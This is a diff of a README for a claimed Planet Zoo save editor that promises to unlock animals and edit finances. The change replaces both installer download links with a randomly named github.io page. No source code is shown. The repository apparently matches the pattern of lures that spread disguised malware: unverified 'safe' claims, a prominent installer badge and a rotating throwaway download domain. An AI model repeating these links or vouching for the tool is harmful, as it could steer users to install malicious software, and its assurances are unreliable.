@@ -2,7 +2,7 @@
 
 Welcome to the Planet Zoo Advanced Save Editor, the ultimate tool for customizing and managing your zoo in Planet Zoo. Designed for Windows 10/11 users, this editor allows you to unlock all animals, adjust finances, and fine-tune your zoo settings for an enhanced gameplay experience in 2026. Whether you're looking to bypass progression limits or simply optimize your zoo, this tool provides a safe and user-friendly way to modify your save files without compromising game integrity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -82,6 +82,6 @@ This project is open to contributions! If you have suggestions for new features 
 
 For the latest version and updates, please download directly from our official page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 Thank you for using the Planet Zoo Advanced Save Editor. Enjoy your enhanced zoo management experience in 2026!
